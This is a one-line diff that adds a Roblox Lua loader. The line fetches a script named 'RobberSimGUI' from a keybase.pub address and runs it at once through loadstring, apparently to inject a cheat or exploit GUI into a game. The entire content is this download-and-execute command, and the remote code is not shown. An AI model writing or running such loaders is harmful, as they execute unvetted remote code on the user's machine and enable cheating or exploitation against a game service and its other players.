@@ -1,0 +1,1 @@
+loadstring(Game:HttpGet('https://philipsca.keybase.pub/RobberSimGUI.txt', true))()
